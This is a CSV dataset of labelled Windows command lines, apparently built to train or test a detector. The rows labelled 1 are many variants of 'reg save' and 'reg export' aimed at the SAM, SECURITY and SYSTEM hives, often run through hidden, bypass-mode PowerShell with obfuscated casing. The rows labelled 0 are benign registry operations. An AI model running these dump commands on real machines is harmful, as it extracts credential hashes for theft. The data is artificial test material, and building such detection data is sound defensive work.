text,label
"REg save ""hKu\SofTWAre\PoliciES\mYCoRP"" ""c:\wiNdOws\teMP\sOFTwARe_dUmP.DaT""",0
"ReG.exe   saVe   ""HkEy_LocAl_maChIne\HKeY_LOCAl_MAcHINe\sySTem\CuRrenTcoNTROlset\contrOL\suBKeY10""   ""c:\UsErS\PubLIc\cHrOME_Data.BAK""   /y",0
"ReG.eXE   DeletE   ""hkeY_USErs\HKEy_LOCAL_MacHinE\SYsTem\cUrReNTcOntROLsEt\cOntROL\sUbkeY21""   /V patH",0
"reg  CoPy  ""HkEy_usErs\sOFtWARE\pOlIcIEs\mYCORP\SuBkey33""  ""hKey_USeRs\hkey_LocAl_MACHine\soFTwaRE\WoW6432nODE_510""",0
"sTArt /b ReG.exe   DeleTE   ""hKey_uSerS\EnviROnmEnt""   /v pATh",0
PwSh -noPrOfIle -C REg  ExporT Hklm\sAm \\lOCaLhOSt\c$\__dUmp\saM.baK,1
cMD.EXe /c REg   Save hkey_loCAl_MacHinE\SYstem \.\c$AcKup.rEg,1
c:\windows\system32\cmd.exe /k reg.exe   export   hklm\sam   c:\users\public\registry_export.reg,1
"Cmd /C powERSheLL -C ""REG sAvE  HkeY_lOcAl_maCHine\SeCUritY c:\UserS\pUBLIC\REgistrY_eXPoRt.rEg""",1
"reg.exe   compare   ""hkey_current_user\software\microsoft\windows\currentversion""   ""hkey_current_user\software\myapp\settings_599""",0
"REG.EXE   ADd   ""hKcu\hKey_lOCAl_MacHiNe\SOftwArE\pOLiCiEs\mICROsOft""   /v pAth      /d 1",0
PoweRShelL -ExeC BYPass -W HIDDeN -C rEg.exe   EXPORT hkey_LoCAL_MAchINe\sECUrITY  c:\WINDOWS\TeMp\SAm.SAVe,1
powershell -command reg.exe   save  hklm\system   \\localhost\c$\__dump\sam.bak,1
powerShELl -coMManD REg.EXe  save  HKlm\saM   c:\uSers\PUbLIc\rEGistrY_EXPorT.reg,1
pWSH -noPROfIlE -c rEG  Save  hkEY_LoCAL_MachINe\SySTEM   C:\USeRs\PuBLiC\rEGIStry_ExPort.ReG /y,1
Cmd.eXe /C StART /B reG   eXPoRt  hKLM\sYSTem  c:\tEmp\sYSTEM.Hive  /Y,1
"rEG  deletE  ""hKeY_CurREnt_USer\SOFTwAre\MYaPp\SETtIngs\suBkEY79""  /V PaTh",0
Reg eXport   HklM\sAM   c:\winDoWS\Temp\SAM.save,1
"cmd /c powershell -c ""reg.exe   save   hklm\system  %temp%\sec_backup.dat   /y""",1
"cmd /c reg  add  ""hkey_local_machine\hkey_local_machine\system\currentcontrolset\control""  /v path  /t reg_sz  /d ""c:\program files\app""",0
cMD.Exe /C STArt /B rEG Save  HklM\SAM   \.\C$Ackup.REg,1
"reg.exe query ""hkey_users\software\policies\mycorp\subkey83""",0
REg SAve  HKEY_loCal_maChIne\SEcuritY  \.\C$AcKUP.ReG  /y,1
"reg   query   ""hkey_local_machine\environment\subkey67""   /v path",0
CMd.EXe /c REG savE hkeY_LOcal_MaChiNE\sAM  c:\UsErs\PUblic\REgistrY_EXPORt.rEg,1
"powershell -c reg.exe save ""hkey_local_machine\hkey_local_machine\software\wow6432node\subkey1"" ""d:\backup\registry_hive.dat""",0
"reg save ""hkey_local_machine\hkey_local_machine\system\currentcontrolset\control"" ""d:\backup\registry_hive.dat""",0
"cmd /c powershell -c ""reg.exe export hklm\system  c:\users\public\registry_export.reg""",1
Cmd.exe /C rEG  eXpOrT HKLm\SYsTeM  \.\C$AckUP.rEg   /y,1
PwSH -nOProFilE -c rEg.EXe  eXporT hkEY_lOcal_MAchINE\systeM   c:\uSeRS\puBLIc\rEgISTRY_eXport.reG,1
"reg.exe   delete   ""hku\software\policies\mycorp""   /v lastupdate",0
"REg querY ""hKU\eNvIroNMEnT"" /f",0
"powershell -c reg.exe   compare   ""hkey_local_machine\system\currentcontrolset\services""   ""hkey_local_machine\hkey_local_machine\software\policies\microsoft_506""",0
powershell -exec bypass -w hidden -c reg save   hkey_local_machine\sam  \.\c$ackup.reg  /y,1
"rEg coMpAre ""hku\soFTWARE\goOGLe\cHRoME"" ""hkU\SOftwaRe\googLE\ChrOme_478""",0
"reg  unload  ""hkey_local_machine\hkey_local_machine\software\wow6432node\subkey55""  /v lastupdate",0
"REG.EXE cOPY ""hKEY_LocAL_machinE\sYstEM\cuRrENTcoNTroLsEt\seRvICes\SubKey47"" ""hKEY_LocAL_MacHINe\SOFTwARe\myapp\SETTIngS_490""",0
CMD.exE /c REg   Save  HKlM\sAM   c:\wINdows\tEmp\Sam.SAve,1
"PowErShelL -C Reg uNLoAD ""HKcu\EnVIRONmEnt\SUbKEY12"" /V vERsioN",0
powershell -exec bypass -w hidden -c reg.exe   save hkey_local_machine\system \.\c$ackup.reg /y,1
cmd.exe /c reg  export hkey_local_machine\sam  \.\c$ackup.reg,1
"cmd /c reg   delete   ""hku\software\microsoft\windows\currentversion""   /v lastupdate",0
"rEg aDd ""HKEY_cUrreNT_UseR\hKey_locAL_MaCHINE\soFTwaRE\POLicieS\MICRosOFt"" /v VersIOn /T ReG_sZ",0
c:\WINDoWS\sYSTEm32\CMd.exE /K rEG ExPORt  HkeY_LOcAl_mAchINe\sECUritY   c:\temp\sYSTem.HIVE,1
CmD.EXe /C STARt /B rEg.eXe   save HKLm\SaM  \\LOCALhOST\c$\__DuMP\sAm.BAk,1
"reg   query   ""hku\environment\subkey52""   /v version",0
"reg   delete   ""hkcu\control panel\desktop""   /f",0
"reg.Exe  reSTORE  ""hKeY_loCAL_MAcHINE\SoftWArE\pOLicieS\MyCOrp""  ""HkEY_LoCaL_MAcHiNe\SoFtwARe\micRosOFt\winDOwS\cuRrENtveRSIoN_642""",0
reg.eXe exPORT hkEY_LOCaL_maChIne\sAM \.\c$aCkuP.Reg,1
PowERSheLL -COMMAnd reG.EXE EXpOrt   HKLm\saM  %Temp%\SEc_BacKup.daT,1
"powershell -c reg.exe  copy  ""hku\hkey_local_machine\system\currentcontrolset\control""  ""hku\software\policies\mycorp_470""",0
"Reg.ExE  query  ""HkEY_uSERs\sOftWArE\GOOgLe\ChRomE\SUBKeY65""",0
c:\windows\system32\cmd.exe /k reg  save hklm\sam   c:\temp\system.hive /y,1
"PowerSheLL -C reG   UNLoad   ""hKeY_UsErs\SYsTEM\cUrReNTCOnTROlsEt\sERVICeS\subKEY89""   /V VErsion",0
cmD.ExE /c staRT /b REG EXpORT Hklm\seCUrity \\LOcaLhOst\C$\__dUmP\SaM.BaK  /y,1
pOWerSheLL -exeC byPaSS -w hIDDEN -c ReG   saVE   hklM\SYstEm  \\LocalHoSt\C$\__dUMP\sAm.bak,1
"CmD /C PoWERSheLL -C ""rEG EXPort  hklM\SySTem \.\C$ACKUp.rEg /Y""",1
Cmd.EXe /C Reg.exe   expoRt   HKey_local_mAChine\SaM  \\locaLHOst\c$\__dUMP\sAM.Bak,1
pOWerShEll -eXeC BYPass -w hiDdEn -C ReG   EXpORT   HKlm\SYsTeM  \\LoCALhosT\c$\__dUMp\SaM.BAK,1
PoWERsHelL -EXEc bYPaSs -w HiDdEN -C rEg.ExE   eXpORT HKlM\SYsteM   C:\tEmp\SySTem.hIvE   /y,1
"CmD /c rEg.EXE   DELetE   ""hKu\hKEY_locAL_mAcHIne\SOFtWare\WoW6432NoDE""   /v PAth",0
"poWersHELl -c rEg.ExE UnloAd ""HKcU\sofTWARe\GOOGle\cHrOme"" /f",0
"pOwERSHELl -c rEG  resTORE  ""hkey_cuRrenT_USer\conTrol pAneL\DesktOp\suBKeY16""  ""HkEy_curreNT_uSeR\ENVIroNMent_817""",0
CMd.Exe /C reG.eXe   SAVE HkEy_LOcAl_macHINe\seCurIty  c:\TEMP\SYStem.HIVe   /y,1
"Cmd /c pOWErSHELL -C ""ReG   ExpOrt hkeY_locAL_mAChine\SAm  \.\C$AcKUP.rEG""",1
cmd.exe /c reg  save   hklm\system  c:\users\public\registry_export.reg,1
c:\windows\system32\cmd.exe /k reg.exe   save   hklm\sam c:\users\public\registry_export.reg /y,1
c:\windows\system32\cmd.exe /k reg.exe  export hklm\sam  %temp%\sec_backup.dat  /y,1
ReG.exE   sAVE HKeY_local_maChIne\SysTEm  C:\wiNDOWs\tEMP\SAM.SAve  /Y,1
"Reg  Add  ""hkeY_uSeRS\HKeY_Local_macHinE\SOfTwArE\poLicIEs\mICrosOfT\suBKEY27""  /V PATh  /T rEg_dWOrd  /d ""c:\pROGrAm FileS\APP""",0
C:\windOwS\sYSteM32\CMd.eXE /K reG.ExE eXPorT   HKEy_LoCAL_MAChiNE\sYSTem  c:\Temp\SyStEm.hiVe,1
"REg.exe  qUERy  ""Hkcu\sOftWare\POlICIeS\mYcorP""  /f",0
"REg resTore ""HKEY_UsERS\Hkey_LOcaL_mAchinE\soFTWaRe\WOw6432NOde"" ""hKEy_uSERS\SoFTWaRe\claSSES_727""",0
cmd.exe /c start /b reg.exe   export hkey_local_machine\system   c:\users\public\registry_export.reg   /y,1
"StArt /b rEG DEleTE ""hKEY_USeRs\Hkey_locaL_MACHInE\soFtwaRE\PolIcIes\mIcRoSOFT""",0
"reg   QuERy   ""hKCU\eNvironMeNT""   /v vErSIon",0
cmd.exe /c reg  export hkey_local_machine\sam  c:\temp\system.hive   /y,1
"CMD /c PowerSheLl -c ""REG.eXe sAve hkeY_lOCAL_mAchiNE\sAM  c:\TEMp\sYSTeM.HIVe   /y""",1
"reg   unload   ""hku\software\microsoft\windows\currentversion""   /v lastupdate",0
"StARt /B rEG.eXE  QUerY  ""hKU\SYSTEM\cuRrENtCONTrOLset\SERVICES\Subkey11""  /F",0
"Cmd /c REG UnloaD ""HkeY_CUrReNT_user\hKEy_LocAl_mAchinE\soFTWAre\POlicIeS\MiCrOsoFT\sUBkEy85"" /v lAStuPDAte",0
PoWersHElL -ComManD reG  eXport  HklM\securiTy  \\LocAlHosT\c$\__Dump\Sam.BAk  /y,1
"reg.exe unload ""hkey_local_machine\software\policies\mycorp"" /f",0
C:\WindOWS\sYsTeM32\Cmd.eXe /k Reg.ExE  Save  HKLm\SysTeM C:\Users\pUBLiC\ReGIStRy_eXpORT.REG,1
"reg.EXe  CoMpAre  ""HKU\sOFTWArE\google\chRoME\suBKEy92""  ""HKu\hKeY_lOCAl_mACHiNe\SySTem\CuRREntCoNtRolSEt\contROL_145""",0
"poWErSHElL -c rEG.EXe   ResTorE   ""hku\sOFTWaRe\myapp\SeTtInGs\SUBkEY48""   ""hKU\ENVIRoNMENt_115""",0
"cmd /c reg   delete   ""hkcu\software\classes""   /v path",0
reg  Save   hklM\sysTeM \.\C$ACkup.reG,1
pOWersHelL -CommAND rEg.eXe  exPoRT   hKEY_LOcal_MAcHinE\SaM   C:\USErs\PubLIC\ReGistry_eXpOrT.Reg  /Y,1
"reg.exe save ""hkey_local_machine\hkey_local_machine\software\wow6432node\subkey43"" ""%temp%\non_sensitive.hive"" /y",0
cmD.exe /C rEg.exe  ExPorT   hKeY_LOCaL_machiNE\SAm c:\TEmP\SYSTEM.hIVE  /y,1
cmD.EXe /C StArT /b reg  saVe  HkLm\securIty   C:\TEMp\system.hIvE,1
cMd.EXE /C STaRt /b reg.ExE   sAvE  hKlM\sYSTeM   c:\uSeRs\pUBliC\RegistRy_EXPorT.Reg /y,1
"POWErSheLl -c rEg.Exe ADD ""HkU\HKEY_LoCal_macHInE\SoftwarE\PoLIcieS\MiCrOSofT"" /F",0
"rEg.ExE   QUEry   ""HKEY_cuRRENT_UsEr\SoFTWArE\myaPp\sEttIngS\sUbKEy33""   /F",0
cMd.exE /C stArT /B reG.exE eXpOrt  hklM\sYstEm   \.\C$ACkUp.rEg,1
"rEG  SAvE  ""HKu\SOFtWaRE\poLICIEs\mYCORp""  ""d:\bACKuP\REgiStRy_Hive.DAt""  /Y",0
"reg.exe restore ""hkey_current_user\hkey_local_machine\software\wow6432node"" ""hkey_current_user\hkey_local_machine\software\wow6432node_592""",0
reg.exe   export hklm\sam %temp%\sec_backup.dat,1
"reg save ""hkey_current_user\system\currentcontrolset\services\subkey76"" ""c:\users\public\chrome_data.bak"" /y",0
cMD.eXE /c STarT /B rEG.ExE  eXPoRt  HkeY_LOCal_MaChINe\SECURItY   C:\UseRs\PUBlIc\rEGistRY_expOrT.Reg  /Y,1
"cmd /c powershell -c ""reg.exe export  hkey_local_machine\system  c:\temp\system.hive""",1
powershell -command reg export hkey_local_machine\sam   \\localhost\c$\__dump\sam.bak /y,1
rEg.EXe eXPort   HkEy_lOCAl_MaChinE\sEcUrIty   C:\tEmp\SystEM.HiVE /y,1
"CMD /C POwerShEll -c ""reG  SAVE  HKLM\SAM   c:\USErs\PUblIC\regIsTRY_expORT.reg""",1
"CMD /c Reg.exe COmparE ""hkeY_LOcAL_mAcHIne\CoNTROL pANeL\DeSKtOP\SuBKey65"" ""hkEy_LOcAl_mAcHiNe\ENvIroNMENT_266""",0
"reg.exe   restore   ""hkey_users\software\microsoft\windows\currentversion""   ""hkey_users\hkey_local_machine\system\currentcontrolset\control_812""",0
"REG.EXE UNloAD ""hKeY_loCal_MacHinE\sYsTEM\cURRentcOnTROLSEt\serviCes\subkeY18"" /v LastUPdATE",0
"reg.exe   compare   ""hkcu\software\google\chrome\subkey53""   ""hkcu\software\myapp\settings_665""",0
POWersHelL -eXEc BYPAss -W HIDDen -c REG.eXe   EXpoRt hkLM\sEcuRIty c:\WiNdOWS\tEmp\SaM.SavE /Y,1
reG.ExE   ExPoRT hKEy_lOCal_mAcHiNE\sECURity   \\loCALHoST\c$\__DUMP\Sam.BaK /Y,1
cMD.exE /C rEG  save   HkLM\SYStem   c:\UseRS\public\rEGiSTrY_EXport.REG  /Y,1
c:\wiNDOWS\sYsteM32\cmD.EXe /K Reg.eXe   SaVe  hkLM\Sam   c:\tEMp\sySTEm.hive,1
"reg.exe  query  ""hkey_users\software\microsoft\windows\currentversion\subkey67""  /v version",0
cMD.ExE /C stARt /B rEG saVe  HkLm\sYsTEM C:\wInDows\tEmP\sam.SAVe /Y,1
PowerSHELl -cOmMaNd rEg.EXE SAVE   HKlm\SAM c:\tEMp\SYsTEm.hiVe   /y,1
"rEg  deleTe  ""hKU\sofTwaRe\poliCIeS\MYcoRP""  /v LAsTuPdate",0
rEG EXPoRT Hkey_LOcAL_mAcHiNE\saM   %tEmp%\SEC_baCkUP.dAT,1
"POwERSHeLl -c ReG.exE  CoPY  ""HkeY_curRENT_USeR\SOFTwAre\poLiCIeS\MYCoRp\SuBKey34""  ""hKey_cUrreNT_usEr\SOFtwaRe\GOogLE\CHRoME_592""",0
c:\windows\system32\cmd.exe /k reg   export hkey_local_machine\system  c:\temp\system.hive,1
"cmd /c reg   compare   ""hkey_users\software\myapp\settings""   ""hkey_users\hkey_local_machine\software\policies\microsoft_417""",0
powershell -exec bypass -w hidden -c reg.exe   export hkey_local_machine\security c:\windows\temp\sam.save,1
"POweRshell -C REg  Unload  ""hKU\SOftwARE\classes""  /v patH",0
poweRsheLl -cOmmaND REG.Exe  EXpOrT  hklm\SecuRItY   C:\TeMP\sYSTem.hiVE  /Y,1
"cMd /C reG.EXE DElEtE ""hKEy_CuRRENt_UsER\sOFTWaRe\MYAPP\SETtiNGs"" /F",0
"powershell -c reg.exe restore ""hku\hkey_local_machine\system\currentcontrolset\control"" ""hku\hkey_local_machine\software\policies\microsoft_323""",0
"cmd /c rEg.EXE   quEry   ""hkey_USErs\hkEY_lOcal_machINe\SoFtwArE\WoW6432nodE\SuBKey80""   /f",0
"rEG   adD   ""Hkey_LoCal_maChinE\SoFtwaRe\cLaSSeS""   /v PaTH      /D ""C:\pROgRAM FILEs\aPp""",0
"poWERShelL -C rEg.EXe  aDd  ""Hkey_LOcal_MaCHINE\SOftWarE\cLASsEs\SubKEy1""    /t REg_sZ  /D ""1.0.0""",0
"ReG.ExE   ADd   ""hkeY_LOcaL_MachINe\SOFtWare\MICrOsoFT\WiNDoWS\cURRentVersiOn""   /v veRSIOn      /d ""c:\pROGRaM FILEs\apP""",0
"REg   cOMPare   ""hku\SofTWaRe\GoogLe\CHrOmE""   ""HKU\SYsTeM\currEntcONTroLsET\seRvICEs_122""",0
"reg   reStOrE   ""hKU\SoFtware\mYApp\settiNgS""   ""Hku\EnvIRoNMeNT_776""",0
"reG  QuEry  ""Hkey_UserS\hKEY_loCAL_mAChINE\SysTem\cuRREnTConTROlSET\ContRol\subkEy72""  /f",0
cmd.exe /c start /b reg.exe save   hkey_local_machine\sam  \.\c$ackup.reg,1
cmd.EXe /C rEG   sAvE   HKlM\systEm \.\c$aCkUp.Reg   /y,1
c:\wInDOws\sysTEm32\CMD.exE /K REG   SaVE   HKeY_locAL_MACHINE\secUrity  %temp%\sec_bacKUp.DAT   /y,1
powershell -exec bypass -w hidden -c reg  save hklm\security  c:\windows\temp\sam.save  /y,1
powershell -command reg.exe  export   hkey_local_machine\system %temp%\sec_backup.dat /y,1
"rEG.EXe  UNLOaD  ""HkeY_uSERS\EnviRonmEnT""",0
POWERsHeLL -eXec bYPaSS -W hIdDEN -c Reg   exPOrT   hklM\SAm  %teMP%\SEC_bACkUP.DAT   /Y,1
C:\windOWs\sYStem32\CmD.eXE /k reG.Exe exPORt  hkEY_loCAl_MaCHInE\SaM   \.\c$ACKuP.reG,1
"reg  delete  ""hku\hkey_local_machine\system\currentcontrolset\control""",0
powershell -exec bypass -w hidden -c reg save  hklm\system   %temp%\sec_backup.dat   /y,1
poWeRshElL -EXEC BYPASs -W HiDDeN -C reG.eXe   saVe   hKEy_LocAl_mACHine\securitY   C:\WINDOWS\temp\SAm.savE  /Y,1
"cmD /C poWErSheLL -c ""Reg  sAVe  hKlM\Sam   \\LOcALHost\C$\__dUmp\sAM.bak /y""",1
rEg.ExE  sAvE   HKLm\SEcuRIty C:\wINDoWS\TEMp\SAm.sAVE /Y,1
c:\windows\system32\cmd.exe /k reg.exe   export  hklm\sam   c:\users\public\registry_export.reg,1
CmD.exe /c stArT /b ReG  sAVe   HKEy_lOcal_macHiNE\SYstEM   c:\USeRS\pUBLiC\REgistRY_ExpoRt.rEg   /Y,1
"rEg.Exe   CoPY   ""HkU\soFTwaRe\CLaSses\sUBkEY93""   ""HkU\hkEy_lOcal_MACHinE\sOFTwarE\Wow6432node_238""",0
Cmd.exe /C STaRt /b reg expOrt   hkey_locAl_maCHinE\SAm  c:\windOWS\teMP\sam.saVE  /y,1
cMd.Exe /C sTARt /B reG  sAVe   HklM\SYStEm   \.\C$AcKuP.ReG,1
"cMd /c POWeRsHelL -c ""ReG   eXPort Hklm\SYstem \\LoCALHOST\C$\__dUMp\Sam.baK""",1
c:\windows\system32\cmd.exe /k reg.exe  export   hkey_local_machine\security c:\windows\temp\sam.save,1
c:\windows\system32\cmd.exe /k reg.exe  save  hklm\security  c:\temp\system.hive  /y,1
"cMd /C POwErshelL -C ""REg   saVe   Hkey_lOCal_macHiNe\sAm  \\lOCalHOST\c$\__DUmp\sAm.bAK /y""",1
"start /b reg.exe save ""hkey_current_user\hkey_local_machine\software\wow6432node\subkey76"" ""c:\users\public\chrome_data.bak""",0
"reG.exE   DelETe   ""HkeY_lOCAL_MACHinE\coNtrol PANEl\DESKToP\SuBkeY27""   /V lAstUpDaTE",0
cMd.EXE /c reg saVe  HkLM\sysTem   \\loCaLHoSt\C$\__dUMp\SAm.baK,1
"CmD /C ReG   cOmPArE   ""hkEy_usErS\SoftWArE\MYApp\SetTiNGs""   ""hkEy_uSERS\SYStEm\CUrrenTcOntroLSEt\SErVICes_702""",0
pOWErshEll -COMManD reG   SAVe HklM\System  \\loCaLHOst\C$\__DUmP\sam.BAk   /y,1
reg.eXe expoRT  HKEy_lOCaL_mACHine\sYsTem  C:\tEmp\System.hIVe  /Y,1
"reG coPy ""hKey_uSerS\cOntRol PaNEl\deSktop\sUbKEy64"" ""hkEy_UsERS\hKeY_LoCAL_MacHInE\soFTware\POLiCies\miCROSoft_990""",0
"Reg   coPY   ""hKU\HkeY_LOCaL_mAChInE\SOFTWARE\woW6432NODe""   ""hKU\hkeY_LOCaL_maChine\sOFtwARe\woW6432nOde_742""",0
reg save HKLM\Software\Wow6432Node C:\temp\wow64.reg,0
cmd.exe /c reg export  hklm\security  c:\windows\temp\sam.save /y,1
"reg  query  ""hkcu\software\myapp\settings\subkey72""  /v version",0
rEg.ExE  eXPOrt HKey_locaL_MaChinE\sEcURiTY \\locAlhOst\c$\__DuMp\saM.BaK,1
"stART /B rEg.EXe  reStORe  ""hKEy_cUrRENT_usER\softwaRe\miCrOSoFT\wIndOwS\cURrentverSiOn""  ""HKEY_CUrRENt_uSER\HkEy_LOCaL_MaChinE\SystEm\cURReNTConTrOLseT\coNTRoL_833""",0
cmD.eXe /c reG.exe  Save  HklM\SySTem \\LocaLhOSt\C$\__dUmP\SaM.bAk,1
"ReG.Exe  SaVe  ""hkcU\CoNTROl PAneL\dEskToP""  ""C:\TEmp\USeR_sETtiNGS.rEg""",0
"pOWErsHEll -c reG.ExE  coMPare  ""HKeY_lOCAl_mACHINe\sOFTWAre\CLASses\sUbKEy70""  ""Hkey_LOCAL_mAChiNE\SOFtWARE\cLAssEs_139""",0
"cmd /c reg compare ""hkey_users\software\google\chrome\subkey8"" ""hkey_users\software\google\chrome_538""",0
"ReG.Exe adD ""hKeY_CUrrEnT_UseR\SoftwaRe\pOlicIES\MYCORp""   /d ""1.0.0""",0
"Reg qUErY ""Hku\enVirONMEnT"" /V LAstuPDATE",0
"start /b reg  delete  ""hkey_current_user\software\myapp\settings\subkey28""  /f",0
c:\windows\system32\cmd.exe /k reg  export   hklm\sam %temp%\sec_backup.dat /y,1
"cmd /c powershell -c ""reg.exe   export hklm\security \.\c$ackup.reg  /y""",1
"start /b reg.exe copy ""hkey_current_user\system\currentcontrolset\services"" ""hkey_current_user\hkey_local_machine\software\wow6432node_428""",0
"CMD /c REg.exE  DElEte  ""HKey_lOcAl_maChINE\SofTWArE\mYaPP\SetTIngs\subkeY33""  /v LAStUPdATE",0
"Reg.EXE  deLeTE  ""hKcU\Hkey_LOCAL_maChine\sYSTeM\CURRentConTroLSeT\contrOL""  /F",0
"Reg  UNlOad  ""Hkey_lOcAL_MACHInE\HKeY_loCal_MAchIne\SofTwARE\policIeS\MiCROsOft\SUBkey69""  /V version",0
powErshEll -Exec BYPAss -W HiDDen -C rEg   savE HkeY_lOcAl_MachINE\sAM  c:\TEmP\system.HIve /Y,1
pOWeRshELL -COMMAnd rEg sAve HKEY_LoCaL_MaCHine\sAM   c:\wINDOWS\tEMp\saM.sAvE,1
"rEG.EXE  adD  ""HKey_LOCAl_MachiNe\ENViRonMEnt\sUBKEY98""  /V VersiON  /t reG_dWoRd  /d ""c:\pRoGraM files\aPp""",0
"reG   cOpY   ""hKeY_UsERS\SYStem\cuRRenTcoNtROlset\serVIcES""   ""hKey_userS\cONTRol Panel\desKToP_142""",0
poWErshell -CoMmANd rEG.EXE  ExpoRt  HKLm\sEcUrITY   c:\Temp\SYsTEm.HIvE,1
"reg  copy  ""hkey_users\software\policies\mycorp""  ""hkey_users\software\microsoft\windows\currentversion_828""",0
reg save   hklm\system \.\c$ackup.reg /y,1
POWersheLl -COMMAND reg  save hKLm\sYsTEM   \\lOCalhost\C$\__duMP\Sam.baK  /y,1
"stARt /B reG  qUeRy  ""hKcu\soFTWaRE\PolICIEs\MYcORP\suBkeY10""  /v lAstupdatE",0
"reg  add  ""hkey_local_machine\hkey_local_machine\system\currentcontrolset\control""  /f  /t reg_dword  /d ""1.0.0""",0
"cMd /C reg.EXE   AdD   ""hku\sOFtwArE\MICRosofT\wINDowS\cURrEnTVeRSioN\suBkeY74""   /V PAtH",0
rEg   EXPorT  HkeY_lOcal_mAChINE\SYSTEm  %TEmP%\sEc_BackUp.daT   /y,1
"REG saVE ""hkEy_LocAl_MaCHiNe\HKeY_LOcAL_machiNe\sySTEm\cURrentcontroLset\cONtROl\subKeY13"" ""C:\useRs\pubLIc\cHrOme_DaTa.Bak""",0
POWERSHeLL -eXec BYPASs -W hiddEN -c reg.eXE  SaVE   hKEY_LOcal_maCHinE\SeCuRITy   \.\c$ackuP.reG,1
pWsh -NOPROfILe -c REG.EXe   EXport  hKEy_lOCAL_mAcHiNE\sAM c:\WiNdOWS\temp\sAM.saVE,1
pOWeRsHelL -cOmmand reG.ExE eXPORT  HKLM\sam   c:\TeMP\systeM.HIvE  /y,1
"CMd /c POwersHEll -c ""reg.eXe  SaVe   HkLM\sam \\LoCaLhOSt\C$\__Dump\Sam.bak  /Y""",1
"ReG  cOpY  ""HkU\hkeY_loCAL_MAcHINe\SOFtwaRe\WoW6432nOdE\SuBKey61""  ""hKU\control pANel\desKtOP_467""",0
C:\wINDOws\sysTEM32\CMD.EXe /k REG Export   HKeY_lOCaL_mAChiNE\SAM   \\locaLhosT\C$\__dUMp\Sam.bak,1
pwSH -nOPROFile -c reg   EXPoRt   HkLM\sAM   C:\tEMp\sySTeM.hIVE /y,1
"cmd /c powershell -c ""reg  export hkey_local_machine\system   \\localhost\c$\__dump\sam.bak""",1
"rEg.exE comParE ""HKEy_cuRRent_user\HKEY_lOCAl_MACHInE\SofTWAre\WOw6432noDe\suBkEy82"" ""HkeY_cUrreNt_useR\Hkey_locAl_MAchine\sOfTwaRe\PolIcIes\miCrOSoFT_481""",0
CMd.EXE /c Start /B rEG EXPoRT   HkeY_lOcal_mAcHine\SYSTEM   \.\c$AckuP.rEG   /Y,1
C:\WInDOwS\System32\CMd.exE /K reg.exe expoRT  hkEy_lOcaL_mAchINE\SAM C:\TeMP\sysTem.hIVE,1
"cmD /c PoWersHElL -c ""Reg.EXe   ExporT  HKLM\sySteM  \\LOCaLHOST\C$\__dump\SAm.bAK   /Y""",1
"powERSheLl -C rEG uNloAD ""hKcu\HKEY_loCAL_MAChINE\SofTwaRE\wOw6432nOdE\SubkEY5"" /v VERSIOn",0
cmd.exe /c reg.exe  save  hklm\sam  c:\temp\system.hive   /y,1
"powershell -c reg copy ""hkey_current_user\software\policies\mycorp"" ""hkey_current_user\hkey_local_machine\software\policies\microsoft_481""",0
"cmD /C REG   queRy   ""hKeY_USErs\HKEY_LoCAL_MAChinE\SoftWaRe\poLiCIEs\micROSOFT""",0
"CmD /c POWerShell -c ""reg.EXe  ExPoRT HkLM\seCUrIty  C:\useRs\PUBlIC\rEgisTry_EXpoRT.Reg""",1
reg save   hklm\security c:\users\public\registry_export.reg /y,1
"cMd /c POwErShELL -C ""rEg.exe  EXpORT  HkeY_LOcAl_MAcHInE\SaM   C:\TEmp\SySTem.HivE""",1
reg.exe   save   hkey_local_machine\system  c:\windows\temp\sam.save,1
CMD.EXE /c sTArt /b ReG.exE Save  HklM\sAm  \\localHOsT\c$\__dUmP\SAm.baK  /y,1
"POWeRsHeLl -c reG   QuErY   ""hkCU\SoftWAre\CLAsSes""   /v PaTh",0
c:\windows\system32\cmd.exe /k reg.exe save   hklm\security \.\c$ackup.reg,1
"REg.ExE  sAvE  ""HkEY_usERs\conTROL PAnel\dEsKtop""  ""%TEMP%\Non_sENSitivE.hIve""",0
PoWersheLl -COmmaNd reg  Save   HKLM\sAM C:\WiNdOWs\TemP\sAm.save  /Y,1
POwERSHeLL -exec byPAss -W HiDDEn -C rEg.EXe sAVE  hkEy_loCAL_MAChIne\sYsteM   %tEmP%\sEC_BaCkUp.daT   /Y,1
"rEg.eXE   QUerY   ""Hkcu\SoFTwAre\PolIcIes\mYcorP""",0
poweRsHell -ExEC byPASS -W HiDDEn -C rEg   savE   Hklm\SEcUrITy   \\LOCAlhOst\c$\__DUmp\sAm.bAk /y,1
powershell -exec bypass -w hidden -c reg.exe  save hkey_local_machine\system   c:\users\public\registry_export.reg,1
"cmd /c powershell -c ""reg export   hkey_local_machine\system  %temp%\sec_backup.dat  /y""",1
